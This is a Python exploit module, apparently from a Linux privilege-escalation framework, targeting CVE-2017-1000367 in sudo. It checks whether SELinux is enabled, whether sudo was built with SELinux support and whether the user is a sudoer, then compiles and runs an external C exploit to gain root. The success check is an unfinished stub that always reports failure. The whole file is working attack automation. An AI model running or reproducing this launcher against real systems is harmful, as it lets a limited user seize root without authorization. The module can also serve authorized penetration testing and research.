"""
adapted from:
https://github.com/c0d3z3r0/sudo-CVE-2017-1000367/sudopwn.c
"""
import os
import subprocess
from exploits.exploit import Exploit
from constants import PLAYGROUND_PATH, LINUX_EXPLOIT_PATH, HIGH_RELIABILITY, color_print
class CVE20171000367(Exploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE-2017-1000367"
		self.brief_desc = "vulnerability in sudo's get_process_ttyname() allows any sudoer to gain root"
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_kernels = {
			"confirmed": [
				
			],
			"potential": [

			]
		}
		self.source_c_path = os.path.join(LINUX_EXPLOIT_PATH, "CVE20171000367.c")
		self.compilation_path = os.path.join(PLAYGROUND_PATH, "CVE20171000367")
		self.compilation_command = ["gcc", "-o", self.compilation_path, self.source_c_path, "-lutil"]
		self.exploit_command = self.compilation_path

	def determine_vulnerability(self):
		"""
		For this vulnerability the following prerequisites have to be satisfied:
			- system must be selinux-enabled
			- sudo needs to be build with selinux support (sudo -r)
			- user needs to have sudo permissions: e.g. 'toor ALL=(ALL)NOPASSWD: /usr/bin/sum

		:return: True if vulnerable, False if not
		"""
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name))
		se_linux_enabled_command = ["cat", "/etc/selinux/config"]		# SELINUX=disabled not in output
		sudo_built_with_selinux_support_command = ["sudo", "-r"] 		# if 'role' is in output, it's supported
		sudo_permissions_check_command = ["sudo", "-l"] 				# if not 'may not run' in output
		sle_output = 		self.shell_results(se_linux_enabled_command)
		sbwssc_output = 	self.shell_results(sudo_built_with_selinux_support_command)
		spc_output = 		self.shell_results(sudo_permissions_check_command)

		if not "No such file" in sle_output[1].decode('utf-8') or not \
						"SELINUX=disabled" in sle_output[0].decode('utf-8'):
			color_print("\t[+] system appears to be selinux-enabled")
			if "role" in sbwssc_output[1].decode('utf-8'):
				color_print("\t[+] sudo appears to be built with selinux support")
				if not "may not run" in spc_output:
					color_print("\t[+] user appears to be a sudoer")
					return True
				else:
					color_print("\t[-] user is not a sudoer", color="red")
					return False
			else:
				color_print("\t[-] sudo does not appear to be built with selinux support", color="red")
				return False
		else:
			color_print("\t[-] system does not appear to be selinux-enabled", color="red")
			return False

	def confirm_exploitation(self):
		"""
		confirm_exploitation

		Checks for implementation specific details that confirm successful kernel exploitation
		:return: True or False
		"""
		return False  # TODO: complete this vuln check to check /tmp/nonce for a specific value

	def exploit(self):
		if self.determine_vulnerability():
			color_print("\t[+] system appears to be vulnerable to {}".format(self.name))
			color_print("\t[*] compiling: \'{}\'".format(" ".join(self.compilation_command)))
			return_code = subprocess.call(self.compilation_command)
			if return_code == 0 and os.path.exists(self.compilation_path):
				color_print("\t[*] exploiting")
				subprocess.call(self.exploit_command)  # TODO: need to make it write a nonce to /tmp/nonce
				if self.confirm_exploitation():
					color_print("\t[+] exploitation of {} successful!".format(self.name), color="green", bold=True)
				else:
					self.exploit_failure("not vulnerable to {}".format(self.name))
			else:
				color_print("\t[-] problem with compilation", color="red")
		else:
			color_print("\t[-] system does not appear to be vulnerable to {}".format(self.name), color="red")